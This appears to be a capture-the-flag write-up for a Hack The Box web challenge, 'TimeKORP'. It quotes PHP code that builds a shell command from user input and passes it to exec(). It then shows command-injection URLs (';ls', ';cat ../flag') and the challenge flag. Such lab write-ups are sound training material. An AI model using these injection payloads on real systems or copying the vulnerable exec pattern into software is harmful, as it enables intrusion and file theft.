# TimeKORP

Description: Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.

> IP: [IP_HERE]

## NOTES / STEPS

1. Deploy Machine
2. Download Files
3. Looking through the code we see something important:

    ```php
        class TimeModel
        {
            public function __construct($format)
            {
                $this->command = "date '+" . $format . "' 2>&1";
            }

            public function getTime()
            {
                $time = exec($this->command);
                $res  = isset($time) ? $time : '?';
                return $res;
            }
        }
    ```

    1. The command is setby "date'+" . $format . "' 2>&1";
       1. We can see in here that the command variable is a concatenated string with $format being something we input
       2. Then in the getTime() function we see that command gets executed by the exec() function
          1. Soooooo... we could potentially bypass this by ending the string and adding our own command
4. TESTING
   1. URL: "http://83.136.254.158:48422/?format=';'"
      1. Just using the semicolon to end the line we see
         1. It's sh: 1: : Permission denied.
         2. Hmm looks like we are getting somewhere
   2. URL: "http://83.136.254.158:48422/?format=';ls'"
      1. Now adding the ls command we get
         1. views
         2. BINGO!
   3. URL: "http://83.136.254.158:48422/?format=';cat ../flag'"
      1. The flag is up a dir so lets use the cat command to get the flag
         1. SUCCESS!
            1. FLAG: `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_46e515f83d07dcd9ab0f6d76b175ca61}`

## QUESTIONS

1. FLAG
   1. `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_46e515f83d07dcd9ab0f6d76b175ca61}`
